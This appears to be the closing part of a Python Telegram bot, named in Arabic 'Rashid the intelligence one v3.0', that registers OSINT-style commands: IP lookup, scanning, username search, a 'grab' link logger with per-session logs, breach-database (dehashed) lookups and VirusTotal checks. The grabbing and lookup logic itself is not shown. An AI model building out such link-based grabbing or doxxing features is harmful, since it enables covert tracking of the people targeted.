                txt += f"[{i}] `{e['session_id']}` — {e['label']}\n🔗 {e['url']}\n\n"
            txt += "◈ تصميم وتطوير: أبو سعود"
            await q.edit_message_text(txt, reply_markup=back_kb(), parse_mode="Markdown")
        return

    if data in MENU_HELP:
        await q.edit_message_text(MENU_HELP[data], reply_markup=back_kb(), parse_mode="Markdown")


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  🚀  تشغيل البوت
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def main():
    if not MAIN_BOT_TOKEN:
        raise RuntimeError("MAIN_BOT_TOKEN غير موجود!")

    app = Application.builder().token(MAIN_BOT_TOKEN).build()

    app.add_handler(CommandHandler("start",    cmd_start))
    app.add_handler(CommandHandler("help",     cmd_help))
    app.add_handler(CommandHandler("ip",       cmd_ip))
    app.add_handler(CommandHandler("scan",     cmd_scan))
    app.add_handler(CommandHandler("osint",    cmd_osint))
    app.add_handler(CommandHandler("user",     cmd_user))
    app.add_handler(CommandHandler("grab",     cmd_grab))
    app.add_handler(CommandHandler("mylogs",   cmd_mylogs))
    app.add_handler(CommandHandler("dehashed", cmd_dehashed))
    app.add_handler(CommandHandler("vt",       cmd_vt))
    app.add_handler(CommandHandler("clear",    cmd_clear))

    app.add_handler(MessageHandler(filters.PHOTO, handle_image))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    app.add_handler(CallbackQueryHandler(handle_cb))

    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print("⚡ راشد الاستخباراتي v3.0 — جاهز")
    print(f"👤 معرّف المدير: {ADMIN_ID}")
    print(f"📡 القناة: {TARGET_CHANNEL_ID}")
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

    app.run_polling(drop_pending_updates=True)


if __name__ == "__main__":
    main()
